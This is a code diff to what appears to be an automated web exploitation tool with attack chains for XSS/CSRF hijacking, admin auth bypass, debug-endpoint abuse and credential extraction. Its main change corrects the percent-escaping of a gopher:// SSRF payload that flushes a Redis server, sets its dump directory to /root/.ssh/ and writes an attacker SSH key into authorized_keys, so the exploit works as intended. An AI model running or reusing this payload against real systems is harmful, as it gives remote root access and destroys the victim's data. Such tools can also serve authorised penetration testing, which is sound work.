@@ -2,7 +2,7 @@ import base64
 import os
 import re
 import tempfile
-from typing import Dict, List, Optional
+from typing import Any, Dict, List, Optional
 
 import requests
 
@@ -270,7 +270,7 @@ def _try_xss_csrf_hijack(param: str, sess: requests.Session,
 
 def _try_auth_escalation(param: str, sess: requests.Session,
                           base_url: str, timeout: float) -> Dict:
-    result = {"chain": "auth_bypass_to_admin", "success": False, "evidence": []}
+    result: Dict[str, Any] = {"chain": "auth_bypass_to_admin", "success": False, "evidence": []}
 
     admin_paths = [
         "/admin", "/admin/users", "/admin/config", "/admin/settings",
@@ -370,11 +370,11 @@ def _try_ssrf_redis_rce(param: str, sess: requests.Session,
         ssh_pub = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCr"
     redis_payload = (
         "gopher://127.0.0.1:6379/_"
-        "*1%0d%0a$8%0d%0aFLUSHALL%0d%0a"
-        "*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$%d%0d%0a%s%0d%0a"
-        "*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/root/.ssh/%0d%0a"
-        "*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$10%0d%0aauthorized_keys%0d%0a"
-        "*1%0d%0a$4%0d%0asave%0d%0a"
+        "*1%%0d%%0a$8%%0d%%0aFLUSHALL%%0d%%0a"
+        "*3%%0d%%0a$3%%0d%%0aset%%0d%%0a$1%%0d%%0a1%%0d%%0a$%d%%0d%%0a%s%%0d%%0a"
+        "*4%%0d%%0a$6%%0d%%0aconfig%%0d%%0a$3%%0d%%0aset%%0d%%0a$3%%0d%%0adir%%0d%%0a$16%%0d%%0a/root/.ssh/%%0d%%0a"
+        "*4%%0d%%0a$6%%0d%%0aconfig%%0d%%0a$3%%0d%%0aset%%0d%%0a$10%%0d%%0adbfilename%%0d%%0a$10%%0d%%0aauthorized_keys%%0d%%0a"
+        "*1%%0d%%0a$4%%0d%%0asave%%0d%%0a"
     ) % (len(ssh_pub), requests.utils.quote(ssh_pub, safe=""))
     test_url = base_url.replace(param + "=", param + "=" + redis_payload)
     try:
@@ -558,7 +558,7 @@ def _extract_creds_from_text(text: str) -> list:
 
 
 def _try_debug_abuse(url: str, sess: requests.Session, timeout: float) -> Dict:
-    result = {"chain": "debug_abuse", "success": False, "evidence": []}
+    result: Dict[str, Any] = {"chain": "debug_abuse", "success": False, "evidence": []}
 
     for ep in DEBUG_ENDPOINTS:
         test_url = url.rstrip("/?&") + ep
